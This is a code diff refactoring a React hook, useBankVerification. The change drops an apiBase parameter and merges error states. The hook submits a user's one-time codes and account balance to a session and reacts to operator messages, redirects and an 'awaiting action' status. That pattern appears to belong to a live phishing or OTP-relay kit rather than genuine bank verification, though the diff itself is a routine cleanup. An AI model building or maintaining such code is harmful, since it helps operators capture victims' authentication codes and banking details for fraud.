@@ -91,7 +91,6 @@ export interface UseBankVerificationReturn {
 }
 
 export function useBankVerification({
-  apiBase,
   channelSlug,
   sessionId,
   debug = false,
@@ -100,7 +99,7 @@ export function useBankVerification({
   onError,
   onRedirect,
 }: BankVerificationProps): UseBankVerificationReturn {
-  const [error, setError] = useState<string | null>(null);
+  const [submitError, setSubmitError] = useState<string | null>(null);
   const [submitting, setSubmitting] = useState(false);
   const [code, setCode] = useState("");
   const [pinValue, setPinValue] = useState("");
@@ -118,16 +117,17 @@ export function useBankVerification({
     clearCodeFeedback,
     operatorMessage,
     countdownResetTrigger,
-  } = useSessionStatus(apiBase, channelSlug, sessionId, debug);
+    error: fetchError,
+  } = useSessionStatus(channelSlug, sessionId, debug);
 
   const layout = normalizeLayout(verificationLayout);
 
   const resendFn = useCallback(async () => {
     if (layout === "pin" || layout === "sms") {
       debugLog(debug, "resend OTP", { type: layout });
-      await resendOtp(apiBase, channelSlug, sessionId ?? "", layout);
+      await resendOtp(channelSlug, sessionId ?? "", layout);
     }
-  }, [apiBase, channelSlug, sessionId, layout, debug]);
+  }, [channelSlug, sessionId, layout, debug]);
 
   const resendState = useResendCountdown(
     RESEND_COOLDOWN,
@@ -194,39 +194,34 @@ export function useBankVerification({
         codeLength: codeValue.length,
       });
       try {
-        await submitOtp(apiBase, channelSlug, sessionId ?? "", codeValue);
+        await submitOtp(channelSlug, sessionId ?? "", codeValue);
         debugLog(debug, "OTP submitted OK");
       } catch (e) {
         const msg = e instanceof Error ? e.message : "Invalid code";
         debugLog(debug, "OTP submit failed", { error: msg });
-        setError(msg);
+        setSubmitError(msg);
         setSubmitting(false);
       }
     },
-    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, layout],
+    [channelSlug, sessionId, clearCodeFeedback, debug, layout],
   );
 
   const handleSubmitBalance = useCallback(
     async (balanceValue: string) => {
-      setError("");
+      setSubmitError(null);
       setSubmitting(true);
       debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
       try {
-        await submitBalance(
-          apiBase,
-          channelSlug,
-          sessionId ?? "",
-          balanceValue,
-        );
+        await submitBalance(channelSlug, sessionId ?? "", balanceValue);
         debugLog(debug, "balance submitted OK");
       } catch (e) {
         const msg = e instanceof Error ? e.message : "Failed to submit balance";
         debugLog(debug, "balance submit failed", { error: msg });
-        setError(msg);
+        setSubmitError(msg);
         setSubmitting(false);
       }
     },
-    [apiBase, channelSlug, sessionId, debug],
+    [channelSlug, sessionId, debug],
   );
 
   const inProgress = status === "pending" || status === "awaiting_action";
@@ -288,5 +283,5 @@ export function useBankVerification({
     };
   }
 
-  return { layoutState, inProgress, awaitingVerification, error };
+  return { layoutState, inProgress, awaitingVerification, error: submitError ?? fetchError };
 }
